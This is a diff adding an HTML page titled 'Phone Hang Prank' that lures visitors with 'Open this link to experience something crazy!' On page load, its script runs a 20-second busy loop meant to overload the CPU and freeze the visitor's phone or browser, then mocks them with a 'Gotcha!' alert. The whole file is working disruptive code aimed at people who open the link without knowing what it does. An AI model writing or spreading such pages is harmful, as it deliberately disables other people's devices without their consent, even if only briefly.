@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Phone Hang Prank</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            margin-top: 50px;
+        }
+
+        #message {
+            font-size: 24px;
+            color: #333;
+        }
+    </style>
+</head>
+<body>
+    <div id="message">Open this link to experience something crazy!</div>
+
+    <script>
+        // Function to freeze the phone (CPU overload)
+        function freezePhone() {
+            var start = Date.now();
+            var end = start + 20000; // 20 seconds delay
+
+            while (Date.now() < end) {
+                // Infinite loop running for 20 seconds
+                // This will overload the CPU and make the phone freeze
+                // Adding some pointless calculations to keep CPU busy
+                Math.random();
+            }
+
+            // Once 20 seconds are over, show a message
+            alert("Gotcha! Your phone was frozen for 20 seconds! 😜");
+        }
+
+        // Start the phone freeze prank as soon as the page is loaded
+        window.onload = function() {
+            freezePhone();
+        };
+    </script>
+</body>
+</html>
